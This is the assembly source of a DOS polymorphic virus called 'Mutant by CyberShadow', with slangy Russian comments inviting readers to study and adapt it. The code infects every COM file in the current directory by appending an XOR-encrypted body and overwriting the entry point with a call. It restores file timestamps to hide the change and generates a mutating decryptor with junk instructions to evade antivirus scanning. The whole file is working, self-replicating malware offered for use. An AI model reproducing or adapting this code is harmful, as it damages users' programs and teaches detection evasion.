.model tiny
.code
org 100h
;--------------------------------------
;┌─────────────────────────────────────────────────────────────────────────────┐
;│                           Hallo, в натуре, пиплы!                           │
;│  Сидел я тут на днях за компом и подумалось мне, шо неплохо было бы расска- │
;│зать вам, дорогие мои деточки, об устройстве ночного кошмара Даунилова, т.е. │
;│вируса полиморфного, ну и заодно продемонстрировать вам его (вируса) родимого│
;│код... Короче написал я тут децильную прогу, спецом для вас! Enjoy it!       │
;│                                              CyberShadow...                 │
;└─────────────────────────────────────────────────────────────────────────────┘
; Осторожно, хоть эта прога и не резидентная она заражает сразу все СОМ проги
; в текущей директории (с полным отсутсвием любых аттрибутов, что сделано
; специально, хотя кто захочет, все равно переделает!)
;--------------------------------------
;Кстати, мальчики и девочки, мне в ломы было писать новый вирус и в результате
;кроме алгоритма полиморфа ловить в нем нехрен. А ваще-то вирус корявый и надо
;бы его подновить >;-[~

Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start
Const3 = offset New_adr - offset Start

Begin:
        call start
;--------------------------------------
Start:
	sti
        cld
        pop DI
        mov BP,3
        sub DI,BP                    ;- DI=100h
        push DI
;      -------------------------------
	call new_adr
new_adr:
	pop si
        sub SI,Const3                ;│ SI=Begin addres
        push SI                      ;┘
;      -------------------------------
        add SI,Const1                ;┐
        push SI                      ;│
        movsw                        ;│ пеpеписали пpавильные
        movsb                        ;┘    пеpвые 3 байта.
;      --------------------------------
        mov DX,SI                    ;┐
        sub CX,CX                    ;│ нашли пеpвое имя файла.
        mov AH,4eh                   ;│
        int 21h                      ;│
        pop SI DI                    ;┘
;--------------------------------------
Next:
        cmp word ptr ds:[9ah],60000  ;┐ длина больше 60000 байт
        jna no_exit                  ;┘ да-вываливаемся
yes_exit:
	jmp exit
no_exit:
        mov DX,80h+1eh               ;┐
        mov AX,3d02h                 ;│ откpыли файл.
        int 21h                      ;│
        jc yes_exit                  ;│
        mov BX,AX                    ;┘
;      --------------------------------
        mov DX,SI                    ;┐
        mov CX,BP                    ;│ читаем пеpвые 3 байта
        mov AH,3fh                   ;│
        int 21h                      ;┘
;      --------------------------------
        cmp byte ptr ds:[si],0e8h    ;┐ проверимся на заражение (E8h-call)
        je close_file                ;┘ да-вываливаемся
        cmp byte ptr ds:[si],'M'     ;┐ а не EXE-шник ли у нас?
        je close_file                ;┘ да-вываливаемся
        cmp byte ptr ds:[si],'Z'     ;┐ а не EXE-шник ли у нас?
        je close_file                ;┘ да-вываливаемся
        mov ax,5700h                 ;┐
        int 21h                      ;│ сохранили время и дату файла
        push dx                      ;│
        push cx                      ;┘
        mov AL,2                     ;┐
        call Proc1                   ;│ пеpеместились
        sub SI,BP                    ;│  на конец ф.
        sub AX,BP                    ;│
        mov [SI+1],AX                ;┘
        push si di bx bp             ;Сохраним реги
        mov si,di                    ;откуда брать код вирия
        mov di, 62000                ;куды его совать в извратном виде
        mov cx,const2                ;какой длины
        call mutant                  ;морфнем его
        pop bp bx di si              ;восстановим реги
;      --------------------------------
        mov AH,40h                   ;│ записали тело вируса
        int 21h                      ;┘
;      --------------------------------
        mov AL,0                     ;┐ пеpеместились
        call Proc1                   ;┘ на начало файла
;      --------------------------------
        mov DX,SI                    ;┐
        mov CX,BP                    ;│ поставили call на вирус
        mov AH,40h                   ;│ в начале файла
        int 21h                      ;┘
;      --------------------------------
        pop cx                       ;┐ восстановили время и дату
        pop dx                       ;│
        mov ax,5701h                 ;│
        int 21h                      ;┘
        add si,bp
close_file:
        sub si,bp
        mov AH,3eh                   ;┐ закpыли файл
        int 21h                      ;┘
;      --------------------------------
        add SI,BP                    ;┐
        mov AH,4fh                   ;│
        int 21h                      ;│ следующий файл
        jc exit                      ;┘
	jmp next
;--------------------------------------
exit:
	ret
        db 'Mutant by CyberShadow...' ; децильный копирайт
;--------------------------------------
Proc1:
        sub DX,DX                    ;- Курсор в файл
        sub CX,CX                    ;
        mov AH,42h                   ;
        int 21h                      ;
        ret                          ;
;--------------------------------------
;Так, мой полиморф отличается следующей особенностью: случайные команды не
;изменяют регистров, что позволило упростить алгоритм и разнообразить набор
;комманд, хотя и упростило нахождение вируса

mutant:
        call m_adress                ;Ага, самоё интересноё!
m_adress:
        pop bp                       ;Определил нач. адрес
	push di cx si di
        in al,40h                    ;Чем будем ксорить
	mov cs:[bp+offset cr_1-offset m_adress-1],al
	mov si,bp
        add si,offset crypted-offset m_adress ;Определили адрес на расшифровщик
        mov al,0e8h                  ;Запихали CALL на расшифровщик
	stosb
	mov ax,const2+2
	stosw
        mov cs:[bp+offset tmp_1-offset m_adress],di ;и запомнили куда складывать зашифрованый вирус
	
        add di,const2+2              ;тэкс, теперь морфнем расшифровщик
crypted_1:
	call poly
	lodsb
	or al,al
	je crypted_cs_1
crypted_cs:
	movsb
	dec al
	jne crypted_cs
	jmp short crypted_1
crypted_cs_1:
        push di
	movsw
	movsb
	call poly
	movsb
	call poly

        movsw            ;add ah,0 добавилка к ксорилке
        push si
        call rnd
        pop si
        stosb
        mov cs:[bp+offset add_crypt-offset m_adress],al
        inc si

	call poly
	movsb
	mov cx,di
	pop bx
	sub cx,bx
	mov al,255
	sub al,cl
	stosb
	inc si
	call poly
	movsw

	pop bx
	pop si cx
        pop dx
        push di                ;Шифранем тело вируса
        mov di,cs:[bp+offset tmp_1-offset m_adress]
        mov ah,cs:[bp+offset cr_1-offset m_adress-1]
crypt_body:
	lodsb
	xor al,ah
        add ah,cs:[bp+offset add_crypt-offset m_adress]
        stosb
	loop crypt_body
        pop di
	mov ax,di
	sub ax,dx
        mov cx,ax
	ret
poly:
	push si bx ax cx
	call rnd
	and bx,15
	inc bl
	xor ch,ch
	mov cl,bl
poly_1:
	push cx
	call rnd
	and bx,15
	shl bx,1
	call poly_2
poly_start:                     ;набор блоков комманд(нечто, комманд под Nдцать получается!)
	dw offset block_0-offset poly_start
	dw offset block_1-offset poly_start
	dw offset block_2-offset poly_start
	dw offset block_3-offset poly_start
	dw offset block_4-offset poly_start
	dw offset block_5-offset poly_start
	dw offset block_6-offset poly_start
	dw offset block_7-offset poly_start
	dw offset block_8-offset poly_start
	dw offset block_9-offset poly_start
	dw offset block_10-offset poly_start
	dw offset block_11-offset poly_start
	dw offset block_12-offset poly_start
	dw offset block_13-offset poly_start
	dw offset block_14-offset poly_start
	dw offset block_15-offset poly_start
poly_2:
	pop si
	mov bx,cs:[si+bx]
	add bx,si
	call bx
	pop cx
	loop poly_1	
	pop cx ax bx si
	mov byte ptr cs:[bp+offset no_flag-offset m_adress],0
	ret
block_0:
	mov ax,00ebh
	stosw
	ret
block_1:
	mov al,8bh
	stosb
	call rnd
	and al,7
	mov bl,al
	shl al,3
	add al,bl
	add al,0c0h
	stosb
	ret
block_2:
	call rnd
	and al,7
	add al,50h
	stosb
	add al,8
	stosb
	ret
block_3:
	mov ax,90cch
	stosw
	ret
no_flags_set:
	push si
	call rnd
	pop si
	and bx,3
	shl bx,1
	mov bx,cs:[si+bx]
	add bx,si
	call bx
	ret
block_4:
	cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	mov al,81h
	stosb
	call rnd
	and al,7
	add al,0f8h
	stosb
	call rnd
	mov ah,al
	call rnd
	stosw
	ret
block_5:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	mov al,81h
	stosb
	call rnd
	and al,7
        add al,0e0h
	stosb
        mov ax,65535
        stosw
	ret
block_6:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
        mov al,81h
	stosb
	call rnd
	and al,7
        push ax
        add al,0e8h
	stosb
	call rnd
	mov ah,al
	call rnd
	stosw
	mov bx,ax
        mov al,81h
        stosb
        pop ax
        add al,0c0h
        stosb
	mov ax,bx
        stosw
        ret
block_7:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	call rnd
	and al,7
        add al,40h
        stosb
        add al,8
        stosb
        ret
block_8:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_8
        jmp no_flags_set
flags_set_8:
        mov cl,3bh
	call rnd
	cmp ax,127
	ja short flags_set_8_1
	mov cl,3ah
flags_set_8_1:
	mov al,cl
        stosb
        call rnd
        and al,63
        add al,0c0h
        stosb
        ret
block_9:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_9
        jmp no_flags_set
flags_set_9:
        mov al,0bh
        stosb
        call rnd
        and al,7
        mov bl,al
        shl al,3
        add al,bl
        add al,0c0h
        stosb
        ret
block_10:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_10
        jmp no_flags_set
flags_set_10:
        call rnd
        and bx,7
        call block_10_1
        db 0f5h,0f8h,0f9h,0fah,0fch,0fdh,90h,0cch
block_10_1:
        pop si
        mov al,cs:[si+bx]
        stosb
        ret
block_11:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_11
        jmp no_flags_set
flags_set_11:
        mov al,0ah
	stosb
	call rnd
	and ax,7
	mov bl,al
	shl al,3
	add al,bl
        add al,0c0h
	stosb
        ret
block_12:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_12
        jmp no_flags_set
flags_set_12:
        mov al,85h
flags_set_1213:
        stosb
        call rnd
        and ax,63
        add al,0c0h
        stosb
        ret
block_13:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_13
        jmp no_flags_set
flags_set_13:
        mov al,84h
        jmp short flags_set_1213
block_14:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_14
        jmp no_flags_set
flags_set_14:
	mov al,80h
	stosb
	call rnd
	and al,07h
	add al,0e0h
	stosb
	mov al,0ffh
	stosb
        ret
block_15:
	jmp block_10
rnd:
	call rnd_1
	db 103
	db 220
	db 30
rnd_1:
	pop si
	mov al,cs:[si]
	add al,cs:[si+1]
	mov cs:[si],al
	add al,cs:[si+2]
	mov cs:[si+1],al
	ror al,1
	mov cs:[si+2],al
	xor bh,bh
	mov bl,al
	ret
crypted:                        ;собственно расшифровщик
	db 3
        mov cx,Const2           ;3 -длины комманд
	db 1
        pop si                  ;1
	db 2
        xor bp,bp               ;2
	db 2
        mov ah,0                ;2
cr_1:
	db 0
cr_3:
        xor cs:[bp+si],ah       ;3
        inc bp                  ;1
        add ah,0                ;3
        loop cr_3               ;2
	jmp si			;2
no_flag db 0
add_crypt db 0
tmp_1 dw 0
Jump:           call Begin           ;- это будет записано в начало проги
FreeByte:       nop                  ;┐ а это место под первые 3 байта проги
                nop                  ;│
                ret                  ;┘
Fname           db '*.com',0         ; маска файла

EndVirus:                            ; И УСЕ !!!!
;--------------------------------------
end begin
